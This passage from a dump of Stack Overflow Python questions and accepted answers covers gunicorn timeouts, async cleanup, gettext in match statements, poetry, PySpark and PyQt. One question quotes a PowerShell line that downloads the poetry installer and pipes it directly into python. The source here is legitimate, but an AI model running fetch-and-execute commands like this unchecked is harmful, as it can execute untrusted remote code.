    "AcceptedAnswer": "I solved the problem by simply uninstalling numpy package:\npip3 uninstall numpy\n\nand reinstalling it:\npip3 install numpy\n\n"
}
{
    "Id": 72118249,
    "PostTypeId": 1,
    "Title": "Why is branchless programming and built-ins slower?",
    "Body": "I found 2 branchless functions that find the maximum of two numbers in python, and compared them to an if statement and the built-in max function. I thought the branchless or the built-in functions would be the fastest, but the fastest was the if-statement function by a large margin. Does anybody know why this is? Here are the functions:\nIf-statement (2.16 seconds for 25000 operations):\ndef max1(a, b):\n    if a > b:\n        return a\n    return b\n\nBuilt-in (4.69 seconds for 25000 operations):\ndef max2(a, b):\n    return max(a, b)\n\nBranchless 1 (4.12 seconds for 25000 operations):\ndef max3(a, b):\n    return (a > b) * a + (a <= b) * b\n\nBranchless 2 (5.34 seconds for 25000 operations):\ndef max4(a, b):\n    diff = a - b\n    return a - (diff & diff >> 31)\n\n",
    "AcceptedAnswerId": 72118450,
    "AcceptedAnswer": "Your expectations about branching vs. branchless code apply to low-level languages like assembly and C. Branchless code can be faster in low-level languages because it prevents slowdowns caused by branch prediction misses. (Note: this means branchless code can be faster, but it will not necessarily be.)\nPython is a high-level language. Assuming you are using the CPython interpreter: for every bytecode instruction you execute, the interpreter has to branch on the kind of opcode, and typically many other things. For example, even the simple  operator requires a branch to check for the  opcode, another branch to check whether the object's class implements a __lt__ method, more branches to check whether the right-hand-side value is of a valid type for the comparison to be performed, and probably several other branches. Even your so-called \"branchless\" code will in practice result in a lot of branching for these reasons.\nBecause Python is so high-level, each bytecode instruction is actually doing quite a lot of work compared to a single machine-code instruction. So the performance of simple code like this will mainly depend on how many bytecode instructions have to be interpreted:\n\nYour max1 function has to do three loads of local variables, a comparison, a conditional jump and a return. That's six.\nYour max2 function does two loads of local variables, one load of a global variable (referencing the built-in max), and also makes a function call; that requires passing arguments, and is relatively expensive compared to other bytecode instructions. On top of that, the built-in function itself has to do the same work as your own max1 function, so no wonder max2 is slower.\nYour max3 function does six loads of local variables, two comparisons, two multiplications, one addition, and one return. That's twelve instructions, so we should expect it to take about twice as long as max1.\nLikewise max4 does five loads of local variables, one store to a local variable, one load of a constant, two subtractions, one bitshift, one bitwise \"and\", and one return. That's twelve instructions again.\n\nThat said, note that if we compare your max1 with the built-in function max directly, instead of your max2 which has an extra function call, your max1 function is still a bit faster than the built-in max. This is probably because the built-in max accepts a variable number of arguments, which may involve building a tuple of arguments, and the built-in max function also has a branch to check if it was called with a single iterable argument (e.g. max([3, 1, 4, 2])), and handle that case differently; your max1 function doesn't do those things.\n"
}
{
    "Id": 72155476,
    "PostTypeId": 1,
    "Title": "Is this \"greedy\" += behavior of lists guaranteed?",
    "Body": "I occasionally use the \"trick\" to extend a list by a mapped version of itself, for example to efficiently compute powers of 2:\nfrom operator import mul\n\npowers = [1]\npowers += map(mul, [2] * 10, powers)\n\nprint(powers)   # prints [1, 2, 4, 8, 16, 32, 64, 128, 256, 512, 1024]\n\nThis relies on the += immediately appending each value from map to the list, so that the map then finds it and the procedure continues. In other words, it needs to work like this:\npowers = [1]\nfor value in map(mul, [2] * 10, powers):\n    powers.append(value)\n\nAnd not first compute and store the whole right-hand side like this, where powers ends up being [1, 2]:\npowers = [1]\npowers += list(map(mul, [2] * 10, powers))\n\nIs it somewhere guaranteed that it works like it does? I checked the Mutable Sequence Types documentation but it doesn't say much about it other than implying equivalence of s += t and s.extend(t). It does refer to MutableSequence, whose source code includes this:\n    def extend(self, values):\n        'S.extend(iterable) -- extend sequence by appending elements from the iterable'\n        if values is self:\n            values = list(values)\n        for v in values:\n            self.append(v)\n\n    def __iadd__(self, values):\n        self.extend(values)\n        return self\n\nThis does suggest that it's indeed supposed to work like it does and like I want it, but some source code being what it is doesn't feel as safe as a guarantee in the documentation.\n",
    "AcceptedAnswerId": 72155954,
    "AcceptedAnswer": "I don't see any tests or docs that the greedy behavior is guaranteed; however, I do think it is the expected behavior and that code in the wild relies on it.\nFWIW, += with lists is equivalent to list.extend(), so your \"trick\" boils down to:\n>>> powers = [1]\n>>> powers.extend(2*x for x in islice(powers, 10))\n>>> powers\n[1, 2, 4, 8, 16, 32, 64, 128, 256, 512, 1024]\n\nWhile I haven't found a guarantee for += or extend, we do have a guarantee that the list iterator allows mutation while iterating.\u00b9  So, this code is on firm ground:\n>>> powers = [1]\n>>> for x in powers:\n        if len(powers) == 10:\n            break\n        powers.append(2 * x)\n\n>>> powers\n[1, 2, 4, 8, 16, 32, 64, 128, 256, 512]\n\n\u00b9 See the second paragraph following the table at:\nhttps://docs.python.org/3/library/stdtypes.html#common-sequence-operations:\n\nForward and reversed iterators over mutable sequences access values\nusing an index. That index will continue to march forward (or\nbackward) even if the underlying sequence is mutated. The iterator\nterminates only when an IndexError or a StopIteration is encountered\n(or when the index drops below zero).\n\n"
}
{
    "Id": 72166020,
    "PostTypeId": 1,
    "Title": "how to install multiple packages in one line using conda?",
    "Body": "I need to install below multiple packages using conda. I am not sure what is conda-forge? some uses conda-forge, some doesn't use it. Is it possible to install them in one line without installing them one by one?  Thanks\nconda install -c conda-forge dash-daq\nconda install -c conda-forge dash-core-components\nconda install -c conda-forge dash-html-components\nconda install -c conda-forge dash-bootstrap-components\nconda install -c conda-forge dash-table\nconda install -c plotly jupyter-dash\n\n\n",
    "AcceptedAnswerId": 72166052,
    "AcceptedAnswer": "Why some packages have to be installed through conda forge:\nConda official repository only feature a few verified packages. A vast portion of python packages that are otherwise available through pip are installed through community led channel called conda-forge. You can visit their site to learn more about it.\nHow to install multiple packages in a single line?\nThe recommended way to install multiple packages is to create a .yml file and feed conda this. You can specify the version number for each package as well.\nThe following example file can be fed to conda through conda install --file:\nappdirs=1.4.3\nasn1crypto=0.24.0\n...\nzope=1.0\nzope.interface=4.5.0\n\nTo specify different channel for each package in this environment.yml file, you can use the :: syntax.\ndependencies:\n  - python=3.6\n  - bagit\n  - conda-forge::beautifulsoup4\n\n"
}
{
    "Id": 72907474,
    "PostTypeId": 1,
    "Title": "Gunicorn with gevent does not enforce timeout",
    "Body": "Let's say I have a simple flask app:\nimport time\nfrom flask import Flask\n\napp = Flask(__name__)\n\n@app.route(\"/\")\ndef index():\n    for i in range(10):\n        print(f\"Slept for {i + 1}/{seconds} seconds\")\n        time.sleep(1)\n    return \"Hello world\"\n\nI can run it with gunicorn with a 5 second timeout:\ngunicorn app:app -b 127.0.0.1:5000 -t 5\n\nAs expected, http://127.0.0.1:5000 times out after 5 seconds:\nSlept for 1/10 seconds\nSlept for 2/10 seconds\nSlept for 3/10 seconds\nSlept for 4/10 seconds\nSlept for 5/10 seconds\n[2022-07-07 22:45:01 -0700] [57177] [CRITICAL] WORKER TIMEOUT (pid:57196)\n\nNow, I want to run gunicorn with an async worker to allow the web server to use its available resources more efficiently, maximizing time that otherwise would be spent idling to do additional work instead. I'm using gevent, still with a timeout of 5 seconds.\ngunicorn app:app -b 127.0.0.1:5000 -t 5 -k gevent\n\nUnexpectedly, http://127.0.0.1:5000 does NOT time out:\nSlept for 1/10 seconds\nSlept for 2/10 seconds\nSlept for 3/10 seconds\nSlept for 4/10 seconds\nSlept for 5/10 seconds\nSlept for 6/10 seconds\nSlept for 7/10 seconds\nSlept for 8/10 seconds\nSlept for 9/10 seconds\nSlept for 10/10 seconds\n\nLooks like this is a known issue with gunicorn. The timeout only applies to the default sync worker, not async workers: https://github.com/benoitc/gunicorn/issues/2695\n\nuWSGI is an alternate option to gunicorn. I'm not as familiar with it. Looks like its timeout option is called harakiri and it can be run with gevent:\nuwsgi --http 127.0.0.1:5000 --harakiri 5 --master -w app:app --gevent 100\n\nuWSGI's timeout sometimes works as expected with gevent:\nSlept for 1/10 seconds\nSlept for 2/10 seconds\nSlept for 3/10 seconds\nSlept for 4/10 seconds\nSlept for 5/10 seconds\nThu Jul  7 23:20:59 2022 - *** HARAKIRI ON WORKER 1 (pid: 59836, try: 1) ***\nThu Jul  7 23:20:59 2022 - HARAKIRI !!! worker 1 status !!!\nThu Jul  7 23:20:59 2022 - HARAKIRI [core 99] 127.0.0.1 - GET / since 1657261253\nThu Jul  7 23:20:59 2022 - HARAKIRI !!! end of worker 1 status !!!\nDAMN ! worker 1 (pid: 59836) died, killed by signal 9 :( trying respawn ...\n\nBut other times it doesn't time out so it appears to be pretty flaky.\n\nIs there anyway to enforce a timeout using gunicorn with an async worker? If not, are there any other web servers that enforce a consistent timeout with an async worker, similar to uWSGI?\n",
    "AcceptedAnswerId": 72938801,
    "AcceptedAnswer": "From https://docs.gunicorn.org/en/stable/settings.html#timeout:\n\nWorkers silent for more than this many seconds are killed and restarted.\n\n\nFor the non sync workers it just means that the worker process is still communicating and is not tied to the length of time required to handle a single request.\n\nSo timeout is likely functioning by design \u2014 as worker timeout, not request timeout.\nYou can subclass GeventWorker to override handle_request() with gevent.Timeout:\nimport gevent\nfrom gunicorn.workers.ggevent import GeventWorker\n\n\nclass MyGeventWorker(GeventWorker):\n\n    def handle_request(self, listener_name, req, sock, addr):\n        with gevent.Timeout(self.cfg.timeout):\n            super().handle_request(listener_name, req, sock, addr)\n\nUsage:\n# gunicorn app:app -b 127.0.0.1:5000 -t 5 -k gevent\ngunicorn app:app -b 127.0.0.1:5000 -t 5 -k app.MyGeventWorker\n\n"
}
{
    "Id": 71183960,
    "PostTypeId": 1,
    "Title": "Short way to get all field names of a pydantic class",
    "Body": "Minimal example of the class:\nfrom pydantic import BaseModel\n\nclass AdaptedModel(BaseModel):\n    def get_all_fields(self, alias=False):\n        return list(self.schema(by_alias=alias).get(\"properties\").keys())\n\nclass TestClass(AdaptedModel):\n    test: str\n\nThe way it works:\ndm.TestClass.get_all_fields(dm.TestClass)\n\nIs there a way to make it work without giving the class again?\nDesired way to get all field names:\ndm.TestClass.get_all_fields()\n\nIt would also work if the field names are assigned to an attribute. Just any way to make it make it more readable\n",
    "AcceptedAnswerId": 72480774,
    "AcceptedAnswer": "What about just using __fields__:\nfrom pydantic import BaseModel\n\nclass AdaptedModel(BaseModel):\n    parent_attr: str\n\nclass TestClass(AdaptedModel):\n    child_attr: str\n        \nTestClass.__fields__\n\nOutput:\n{'parent_attr': ModelField(name='parent_attr', type=str, required=True),\n 'child_attr': ModelField(name='child_attr', type=str, required=True)}\n\nThis is just a dict and you could get only the field names simply by: TestClass.__fields__.keys()\nSee model properties: https://pydantic-docs.helpmanual.io/usage/models/#model-properties\n"
}
{
    "Id": 71861779,
    "PostTypeId": 1,
    "Title": "MWAA - Airflow - PythonVirtualenvOperator requires virtualenv",
    "Body": "I am using AWS's MWAA service (2.2.2) to run a variety of DAGs, most of which are implemented with standard PythonOperator types. I bundle the DAGs into an S3 bucket alongside any shared requirements, then point MWAA to the relevant objects & versions. Everything runs smoothly so far.\nI would now like to implement a DAG using the PythonVirtualenvOperator type, which AWS acknowledge is not supported out of the box. I am following their guide on how to patch the behaviour using a custom plugin, but continue to receive an error from Airflow, shown at the top of the dashboard in big red writing:\n\nDAG Import Errors (1)\n... ...\nAirflowException: PythonVirtualenvOperator requires virtualenv, please install it.\n\nI've confirmed that the plugin is indeed being picked up by Airflow (I see it referenced in the admin screen), and for the avoidance of doubt I am using the exact code provided by AWS in their examples for the DAG. AWS's documentation on this is pretty light and I've yet to stumble across any community discussion for the same.\nFrom AWS's docs, we'd expect the plugin to run at startup prior to any DAGs being processed. The plugin itself appears to effectively rewrite the venv command to use the pip-installed version, rather than that which is installed on the machine, however I've struggled to verify that things are happening in the order I expect. Any pointers on debugging the instance's behavior would be very much appreciated.\nHas anyone faced a similar issue? Is there a gap in the MWAA documentation that needs addressing? Am I missing something incredibly obvious?\nPossibly related, but I do see this warning in the scheduler's logs, which may indicate why MWAA is struggling to resolve the dependency?\n\nWARNING: The script virtualenv is installed in '/usr/local/airflow/.local/bin' which is not on PATH.\n\n",
    "AcceptedAnswerId": 72203130,
    "AcceptedAnswer": "Airflow uses shutil.which to look for virtualenv. The installed virtualenv via requirements.txt isn't on the PATH. Adding the path to virtualenv to PATH solves this.\nThe doc here is wrong https://docs.aws.amazon.com/mwaa/latest/userguide/samples-virtualenv.html\nimport os\nfrom airflow.plugins_manager import AirflowPlugin\nimport airflow.utils.python_virtualenv \nfrom typing import List\ndef _generate_virtualenv_cmd(tmp_dir: str, python_bin: str, system_site_packages: bool) -> List[str]:\n    cmd = ['python3','/usr/local/airflow/.local/lib/python3.7/site-packages/virtualenv', tmp_dir]\n    if system_site_packages:\n        cmd.append('--system-site-packages')\n    if python_bin is not None:\n        cmd.append(f'--python={python_bin}')\n    return cmd\nairflow.utils.python_virtualenv._generate_virtualenv_cmd=_generate_virtualenv_cmd\n#This is the added path code\nos.environ[\"PATH\"] = f\"/usr/local/airflow/.local/bin:{os.environ['PATH']}\"\nclass VirtualPythonPlugin(AirflowPlugin):                \n    name = 'virtual_python_plugin'\n\n"
}
{
    "Id": 73457379,
    "PostTypeId": 1,
    "Title": "Python regex and leading 0 in capturing group",
    "Body": "I'm writing a script in python 3 to automatically rename files. But I have a problem with the captured group in a regex.\nI have these kinds of files :\ntest tome 01 something.cbz\ntest tome 2 something.cbz\ntest tome 20 something.cbz\n\nAnd I would like to have :\ntest 001 something.cbz\ntest 002 something.cbz\ntest 020 something.cbz\n\nI tried several bits of code:\nExample 1:\nname = re.sub('tome [0]{0,1}(\\d{1,})', str('\\\\1').zfill(3), name)\n\nThe result is:\ntest 01 something.cbz\ntest 02 something.cbz\ntest 020 something.cbz\n\nExample 2:\nname = re.sub('tome (\\d{1,})', str('\\\\1').lstrip(\"0\").zfill(3), name)\n\nThe result is:\ntest 001 something.cbz\ntest 02 something.cbz\ntest 020 something.cbz\n\n",
    "AcceptedAnswerId": 73457472,
    "AcceptedAnswer": "You can run the zfill(3) on the .group(1) value after stripping the zeroes from the left side:\nimport re\n\ns = (\"test tome 01 something.cbz\\n\"\n            \"test tome 2 something.cbz\\n\"\n            \"test tome 20 something.cbz\")\n\nresult = re.sub(\n    r'tome (\\d+)',\n    lambda x: x.group(1).lstrip(\"0\").zfill(3),\n    s\n)\nprint(result)\n\nOutput\ntest 001 something.cbz\ntest 002 something.cbz\ntest 020 something.cbz\n\n"
}
{
    "Id": 72842597,
    "PostTypeId": 1,
    "Title": "Why is __aexit__ not fully executed when it has await inside?",
    "Body": "This is the simplified version of my code:\nmain is a coroutine which stops after the second iteration.\nget_numbers is an async generator which yields numbers but within an async context manager.\nimport asyncio\n\n\nclass MyContextManager:\n    async def __aenter__(self):\n        print(\"Enter to the Context Manager...\")\n        return self\n\n    async def __aexit__(self, exc_type, exc_value, exc_tb):\n        print(exc_type)\n        print(\"Exit from the Context Manager...\")\n        await asyncio.sleep(1)\n        print(\"This line is not executed\")  # <-------------------\n        await asyncio.sleep(1)\n\n\nasync def get_numbers():\n    async with MyContextManager():\n        for i in range(30):\n            yield i\n\n\nasync def main():\n    async for i in get_numbers():\n        print(i)\n        if i == 1:\n            break\n\n\nasyncio.run(main())\n\nAnd the output is:\nEnter to the Context Manager...\n0\n1\n\nExit from the Context Manager...\n\nI have two questions actually:\n\nFrom my understanding, AsyncIO schedules a Task to be called soon in the next cycle of the event loop and gives __aexit__ a chance to execute. But the line print(\"This line is not executed\") is not executed. Why is that? Is it correct to assume that if we have an await statement inside the __aexit__, the code after that line is not going to execute at all and we shouldn't rely on that for cleaning?\n\n\n\nOutput of the help() on async generators shows that:\n\n |  aclose(...)\n |      aclose() -> raise GeneratorExit inside generator.\n\nso why I get  exception inside the __aexit__ ?\n* I'm using Python 3.10.4\n",
    "AcceptedAnswerId": 73065347,
    "AcceptedAnswer": "This is not specific to __aexit__ but to all async code: When an event loop shuts down it must decide between cancelling remaining tasks or preserving them. In the interest of cleanup, most frameworks prefer cancellation instead of relying on the programmer to clean up preserved tasks later on.\nThis kind of shutdown cleanup is a separate mechanism from the graceful unrolling of functions, contexts and similar on the call stack during normal execution. A context manager that must also clean up during cancellation must be specifically prepared for it. Still, in many cases it is fine not to be prepared for this since many resources fail safe by themselves.\n\nIn contemporary event loop frameworks there are usually three levels of cleanup:\n\nUnrolling: The __aexit__ is called when the scope ends and might receive an exception that triggered the unrolling as an argument. Cleanup is expected to be delayed as long as necessary. This is comparable to __exit__ running synchronous code.\nCancellation: The __aexit__ may receive a CancelledError1 as an argument or as an exception on any await/async for/async with. Cleanup may delay this, but is expected to proceed as fast as possible. This is comparable to KeyboardInterrupt cancelling synchronous code.\nClosing: The __aexit__ may receive a GeneratorExit as an argument or as an exception on any await/async for/async with. Cleanup must proceed as fast as possible. This is comparable to GeneratorExit closing a synchronous generator.\n\nTo handle cancellation/closing, any async code \u2013 be it in __aexit__ or elsewhere \u2013 must expect to handle CancelledError or GeneratorExit. While the former may be delayed or suppressed, the latter should be dealt with immediately and synchronously2.\n    async def __aexit__(self, exc_type, exc_value, exc_tb):\n        print(\"Exit from the Context Manager...\")\n        try:\n            await asyncio.sleep(1)  # an exception may arrive here\n        except GeneratorExit:\n            print(\"Exit stage left NOW\")\n            raise\n        except asyncio.CancelledError:\n            print(\"Got cancelled, just cleaning up a few things...\")\n            await asyncio.sleep(0.5)\n            raise\n        else:\n            print(\"Nothing to see here, taking my time on the way out\")\n            await asyncio.sleep(1)\n\nNote: It is generally not possible to exhaustively handle these cases. Different forms of cleanup may interrupt one another, such as unrolling being cancelled and then closed. Handling cleanup is only possible on a best effort basis; robust cleanup is achieved by fail safety, for example via transactions, instead of explicit cleanup.\n\nCleanup of asynchronous generators in specific is a tricky case since they can be cleaned up by all cases at once: Unrolling as the generator finishes, cancellation as the owning task is destroyed or closing as the generator is garbage collected. The order at which the cleanup signals arrive is implementation dependent.\nThe proper way to address this is not to rely on implicit cleanup in the first place. Instead, every coroutine should make sure that all its child resources are closed before the parent exits. Notably, an async generator may hold resources and needs closing.\nasync def main():\n    # create a generator that might need cleanup\n    async_iter = get_numbers()\n    async for i in async_iter:\n        print(i)\n        if i == 1:\n            break\n    # wait for generator clean up before exiting\n    await async_iter.aclose()\n\nIn recent versions, this pattern is codified via the aclosing context manager.\nfrom contextlib import aclosing\n\nasync def main():\n    # create a generator and prepare for its cleanup\n    async with aclosing(get_numbers()) as async_iter:\n        async for i in async_iter:\n            print(i)\n            if i == 1:\n                break\n\n\n1The name and/or identity of this exception may vary.\n2While it is possible to await asynchronous things during GeneratorExit, they may not yield to the event loop. A synchronous interface is advantageous to enforce this.\n"
}
{
    "Id": 72225191,
    "PostTypeId": 1,
    "Title": "How can I apply gettext translations to string literals in case statements?",
    "Body": "I need to add gettext translation to all the string literals in our code, but it doesn't work with literals in case statements.\nThis failed attempt gives SyntaxError: Expected ':':\nfrom gettext import gettext as _\n\ndirection = input(_('Enter a direction: '))   # <-- This works\nmatch direction:\n    case _('north'):                          # <-- This fails\n        adj = 1, 0\n    case _('south'):\n        adj = -1, 0\n    case _('east'):\n        adj = 0, 1\n    case _('west'):\n        adj = 0, -1\n    case _:\n        raise ValueError(_('Unknown direction'))\n\nWhat does the error mean and how can the directions be marked for translation?\n",
    "AcceptedAnswerId": 72225192,
    "AcceptedAnswer": "What does the error mean?\nThe grammar for the match/case statement treats the _ as a wildcard pattern.  The only acceptable token that can follow is a colon.  Since your code uses an open parenthesis, a SyntaxError is raised.\nHow to fix it\nSwitch from a literal pattern such as case \"north\": ... to a value pattern such as case Directions.north: ... which uses dot-operator.\nThe translation can then be performed upstream, outside of the case statement:\nfrom gettext import gettext as _\n\nclass Directions:\n    north = _('north')\n    south = _('south')\n    east = _('east')\n    west = _('west')\n\ndirection = input(_('Enter a direction: '))\nmatch direction:\n    case Directions.north:\n        adj = 1, 0\n    case Directions.south:\n        adj = -1, 0\n    case Directions.east:\n        adj = 0, 1\n    case Directions.west:\n        adj = 0, -1\n    case _:\n        raise ValueError(_('Unknown direction'))\n\nNot only do the string literals get translated, the case statements are more readable as well.\nMore advanced and dynamic solution\nThe above solution only works if the choice of language is constant.  If the language can change (perhaps in an online application serving users from difference countries), dynamic lookups are needed.\nFirst we need a descriptor to dynamically forward value pattern attribute lookups to function calls:\nclass FuncCall:\n    \"Descriptor to convert fc.name to func(name).\"\n\n    def __init__(self, func):\n        self.func = func\n\n    def __set_name__(self, owner, name):\n        self.name = name\n\n    def __get__(self, obj, objtype=None):\n        return self.func(self.name)\n\nWe use it like this:\nclass Directions:\n    north = FuncCall(_)  # calls _('north') for every lookup\n    south = FuncCall(_)\n    east = FuncCall(_)\n    west = FuncCall(_)\n\ndef convert(direction):\n    match direction:\n        case Directions.north:\n            return 1, 0\n        case Directions.south:\n            return -1, 0\n        case Directions.east:\n            return 0, 1\n        case Directions.west:\n            return 0, -1\n        case _:\n            raise ValueError(_('Unknown direction'))\n    print('Adjustment:', adj)\n\nHere is a sample session:\n>>> set_language('es')   # Spanish\n>>> convert('sur')\n(-1, 0)\n>>> set_language('fr')   # French\n>>> convert('nord')\n(1, 0)\n\nNamespaces for the Value Pattern\nAny namespace with dotted lookup can be used in the value pattern:  SimpleNamespace, Enum, modules, classes, instances, etc.\nHere a class was chosen because it is simple and will work with the descriptor needed for the more advanced solution.\nEnum wasn't considered because it is much more complex and because its metaclass logic interferes with the descriptors.  Also, Enum is intended for giving symbolic names to predefined constants rather than for dynamically computed values like we're using here.\n"
}
{
    "Id": 72298911,
    "PostTypeId": 1,
    "Title": "Where to locate virtual environment installed using poetry | Where to find poetry installed virtual environment",
    "Body": "I installed poetry using the following command:-\n(Invoke-WebRequest -Uri https://raw.githubusercontent.com/python-poetry/poetry/master/get-poetry.py -UseBasicParsing).Content | python - \nTo know more about it refer this.\nNow I wanted to create a virtual environment, that I created it using the following command:-\npoetry config virtualenvs.in-project true\nTo know more about it refer this.\nBut after doing this, I can`t see any .venv(virtual environment) folder.\nTo check if virtual environment is there, we use the following command:-\npoetry config virtualenvs.in-project\nand if the above command return true, implies you have it.\nI'm getting true, also the location mentioned on the docs I cant see it there.\nCould anyone tell me how to locate the virtual environment now?\n",
    "AcceptedAnswerId": 72298912,
    "AcceptedAnswer": "There are 2 commands I found, that can find where is the virtual environment is located.\n\nCommand:- poetry show -v\nThe first line of $ poetry show -v will tell you where the virtual environment is located.\nAnd the rest will tell you what all libs are there in it.\n\nCommand:- poetry env info -p\nThe above command will give you just the location of virtual environment.\n\n\nHope this will solve your purpose.\nThank you.\n"
}
{
    "Id": 73395718,
    "PostTypeId": 1,
    "Title": "Join dataframes and rename resulting columns with same names",
    "Body": "Shortened example:\nvals1 = [(1, \"a\"), \n        (2, \"b\"), \n      ]\ncolumns1 = [\"id\",\"name\"]\ndf1 = spark.createDataFrame(data=vals1, schema=columns1)\n\nvals2 = [(1, \"k\"), \n      ]\ncolumns2 = [\"id\",\"name\"]\ndf2 = spark.createDataFrame(data=vals2, schema=columns2)\n\ndf1 = df1.alias('df1').join(df2.alias('df2'), 'id', 'full')\ndf1.show()\n\nThe result has one column named id and two columns named name. How do I rename the columns with duplicate names, assuming that the real dataframes have tens of such columns?\n",
    "AcceptedAnswerId": 73459268,
    "AcceptedAnswer": "Another method to rename only the intersecting columns\nfrom typing import List\n\nfrom pyspark.sql import DataFrame\n\n\ndef join_intersect(df_left: DataFrame, df_right: DataFrame, join_cols: List[str], how: str = 'inner'):\n    intersected_cols = set(df1.columns).intersection(set(df2.columns))\n    cols_to_rename = [c for c in intersected_cols if c not in join_cols]\n\n    for c in cols_to_rename:\n        df_left = df_left.withColumnRenamed(c, f\"{c}__1\")\n        df_right = df_right.withColumnRenamed(c, f\"{c}__2\")\n\n    return df_left.join(df_right, on=join_cols, how=how)\n\n\nvals1 = [(1, \"a\"), (2, \"b\")]\ncolumns1 = [\"id\", \"name\"]\ndf1 = spark.createDataFrame(data=vals1, schema=columns1)\nvals2 = [(1, \"k\")]\ncolumns2 = [\"id\", \"name\"]\ndf2 = spark.createDataFrame(data=vals2, schema=columns2)\n\ndf_joined = join_intersect(df1, df2, ['name'])\ndf_joined.show()\n\n"
}
{
    "Id": 72352801,
    "PostTypeId": 1,
    "Title": "Migration from setup.py to pyproject.toml: how to specify package name?",
    "Body": "I'm currently trying to move our internal projects away from setup.py to pyproject.toml (PEP-518). I'd like to not use build backend specific configuration if possible, even though I do specify the backend in the [build-system] section by require'ing it.\nThe pyproject.toml files are more or less straight-forward translations of the setup.py files, with the metadata set according to PEP-621, including the dependencies. We are using setuptools_scm for the determination of the version, therefore the version field ends up in the dynamic section.\nWe used to set the packages parameter to setup in our setup.py files, but I couldn't find any corresponding field in pyproject.toml, so I simply omitted it.\nWhen building the project using python3 -m build ., I end up with a package named UNKNOWN, even though I have the name field set in the [project] section. It seems that this breaks very early in the build:\n$ python -m build .\n* Creating virtualenv isolated environment...\n* Installing packages in isolated environment... (setuptools, setuptools_scm[toml]>=6.2, wheel)\n* Getting dependencies for sdist...\nrunning egg_info\nwriting UNKNOWN.egg-info/PKG-INFO\n....\n\nI'm using python 3.8.11 and the following packages:\nbuild==0.8.0\ndistlib==0.3.4\nfilelock==3.4.1\npackaging==21.3\npep517==0.12.0\npip==22.0.4\nplatformdirs==2.4.0\npyparsing==3.0.9\nsetuptools==62.1.0\nsix==1.16.0\ntomli==1.2.3\nvirtualenv==20.14.1\nwheel==0.37.1\n\nMy (abbreviated) pyproject.toml looks like this:\n[project]\nname = \"coolproject\"\ndependencies = [\n   'pyyaml==5.3',\n   'anytree==2.8.0',\n   'pytest'\n]\ndynamic = [\n   \"version\"\n]\n\n[build-system]\nrequires = [\"setuptools\", \"wheel\", \"setuptools_scm[toml]>=6.2\"]\n\n[tool.setuptools_scm]\n\nAny ideas?\n",
    "AcceptedAnswerId": 73497494,
    "AcceptedAnswer": "Turning @AKX's comments into an answer so that other people can find it more easily.\nThe problem may be an outdated pip/setuptools on the system. Apparently, version 19.3.1 which I have on my system  cannot install a version of setuptools that can handle PEP621 metadata correctly.\nYou cannot require a new pip from within pyproject.toml using the build-system.requires directive.\nIn case you cannot update the system pip, you can always install on a per-user basis:\npip install --user pip\n\nand you're good to go.\n"
}
{
    "Id": 73013333,
    "PostTypeId": 1,
    "Title": "How to make an Angled arrow style border in PyQt5?",
    "Body": "How to make an Angled arrow-type border in PyQt QFrame? In My code, I Have two QLabels and respective frames. My aim is to make an arrow shape border on right side of every QFrame.For clear-cut idea, attach a sample picture.\nimport sys\nfrom PyQt5.QtWidgets import *\n\nclass Angle_Border(QWidget):\n    def __init__(self):\n        super().__init__()\n        self.setWindowTitle(\"Angle Border\")\n\n        self.lbl1 = QLabel(\"Python\")\n        self.lbl2 = QLabel(\"PyQt\")\n\n        self.frame1 = QFrame()\n        self.frame1.setProperty(\"type\",\"1\")\n        self.frame1.setFixedSize(200,50)\n        self.frame1.setStyleSheet(\"background-color:red;color:white;\"\n                                  \"font-family:Trebuchet MS;font-size: 15pt;text-align: center;\"\n                                  \"border-top-right-radius:25px solid ; border-bottom-right-radius:25px solid ;\")\n        self.frame2 = QFrame()\n        self.frame2.setFixedSize(200, 50)\n        self.frame2.setStyleSheet(\"background-color:blue;color:white;\"\n                                  \"font-family:Trebuchet MS;font-size: 15pt;text-align: center;\"\n                                  \"border-top:1px solid transparent; border-bottom:1px solid  transparent;\")\n        self.frame_outer = QFrame()\n        self.frame_outer.setFixedSize(800, 60)\n        self.frame_outer.setStyleSheet(\"background-color:green;color:white;\"\n                                  \"font-family:Trebuchet MS;font-size: 15pt;text-align: center;\")\n\n        self.frame1_layout = QHBoxLayout(self.frame1)\n        self.frame2_layout = QHBoxLayout(self.frame2)\n        self.frame_outer_layout = QHBoxLayout(self.frame_outer)\n        self.frame_outer_layout.setContentsMargins(5,0,0,0)\n\n        self.frame1_layout.addWidget(self.lbl1)\n        self.frame2_layout.addWidget(self.lbl2)\n\n        self.hbox = QHBoxLayout()\n        self.layout = QHBoxLayout()\n        self.hbox.addWidget(self.frame1)\n        self.hbox.addWidget(self.frame2)\n        self.hbox.addStretch()\n        self.hbox.setSpacing(0)\n        # self.layout.addLayout(self.hbox)\n        self.frame_outer_layout.addLayout(self.hbox)\n        self.layout.addWidget(self.frame_outer)\n\n        self.setLayout(self.layout)\n\ndef main():\n    app = QApplication(sys.argv)\n    ex = Angle_Border()\n    ex.show()\n    sys.exit(app.exec_())\n\nif __name__ == '__main__':\n    main()\n\nSample Picture\n\n",
    "AcceptedAnswerId": 73104110,
    "AcceptedAnswer": "Since the OP didn't ask for user interaction (mouse or keyboard), a possible solution could use the existing features of Qt, specifically QSS (Qt Style Sheets).\nWhile the currently previously accepted solution does follow that approach, it's not very effective, most importantly because it's basically \"static\", since it always requires knowing the color of the following item in order to define the \"arrow\" colors.\nThis not only forces the programmer to always consider the \"sibling\" items, but also makes extremely (and unnecessarily) complex the dynamic creation of such objects.\nThe solution is to always (partially) \"redo\" the layout and update the stylesheets with the necessary values, which consider the current size (which shouldn't be hardcoded), the following item (if any) and carefully using the layout properties and \"spacer\" stylesheets based on the contents.\nThe following code uses a more abstract, dynamic approach, with basic functions that allow adding/insertion and removal of items. It still uses a similar QSS method, but, with almost the same \"line count\", it provides a simpler and much more intuitive approach, allowing item creation, deletion and modification with single function calls that are much easier to use.\nA further benefit of this approach is that implementing \"reverse\" arrows is quite easy, and doesn't break the logic of the item creation.\nConsidering all the above, you can create an actual class that just needs basic calls such as addItem() or removeItem().\nfrom PyQt5.QtCore import *\nfrom PyQt5.QtGui import *\nfrom PyQt5.QtWidgets import *\n\nclass ArrowMenu(QWidget):\n    vMargin = -1\n    hMargin = -1\n    def __init__(self, items=None, parent=None):\n        super().__init__(parent)\n        layout = QHBoxLayout(self)\n        layout.setContentsMargins(0, 0, 0, 0)\n        layout.setSpacing(0)\n        layout.addStretch()\n        self.items = []\n        if isinstance(items, dict):\n            self.addItems(items.items())\n        elif items is not None:\n            self.addItems(items)\n\n    def addItems(self, items):\n        for item in items:\n            if isinstance(item, 